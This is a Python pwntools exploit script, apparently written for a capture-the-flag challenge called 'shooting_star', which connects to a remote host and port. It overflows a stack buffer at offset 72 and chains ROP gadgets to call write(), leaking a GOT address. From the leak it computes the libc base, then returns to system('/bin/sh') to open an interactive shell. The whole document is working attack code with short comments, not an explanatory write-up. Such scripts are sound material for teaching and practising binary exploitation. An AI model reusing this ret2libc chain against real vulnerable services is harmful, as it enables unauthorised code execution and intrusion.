from pwn import *

context.arch = 'amd64'

# overflow: ret at offset 72

# p = process('./shooting_star')
p = remote('206.189.121.131', 31601)


# libc = ELF('./libc.self')
libc = ELF('./libc.target')

elf = ELF('./shooting_star')

# when the ret hits, rdx happens to have something in it, so I can use it since there's no gadget for rdx
# $rdx   : 0x1a

STAR_FUNC = 0x00401142 # return to star() to continue exploiting
POP_RDI = 0x00000000004012cb # 0x00000000004012cb : pop rdi ; ret
POP_RSI_R15 = 0x00000000004012c9 # 0x00000000004012c9 : pop rsi ; pop r15 ; ret

def leak_got_address(func_name):
    junk = 'A' * 72
    junk = junk.encode('latin-1')
    # call write(rdi = 1, rsi = memory in GOT, rdx=hopefully I don't have to mess with it)
    payload = junk + p64(POP_RDI) + p64(1)
    payload += p64(POP_RSI_R15) + p64(elf.got[func_name]) + p64(0)
    payload += p64(elf.sym['write'])
    payload += p64(STAR_FUNC)
    p.sendline('1')
    p.recv()
    p.sendline(payload)
    output = p.recv(timeout=0.5)
    leak_text = output.decode('latin-1').split('true!\n')[1]
    if len(leak_text) == 0:
        sleep(1)
        leak_text = p.recv(timeout=0.1).decode('latin-1')
    leak = int.from_bytes(leak_text[:8].encode('latin-1'), 'little')
    return leak

p.recv()
write_address = leak_got_address('write')
print(f"Leaked write address: {hex(write_address)}")
# read_address = leak_got_address('read') # needed address of read as well to narrow down query on libc database
# print(f"Leaked read address: {hex(read_address)}")

# calculate offsets
assert(libc.address == 0)
libc.address = write_address - libc.sym['write']

SH_STRING = next(libc.search('/bin/sh\x00'.encode('latin-1')))
assert(SH_STRING != 0)

# exploit
junk = 'A' * 72
junk = junk.encode('latin-1')
payload = junk + p64(POP_RDI) + p64(SH_STRING) + p64(libc.sym['system'])
p.sendline('1')
p.sendline(payload)
p.interactive()
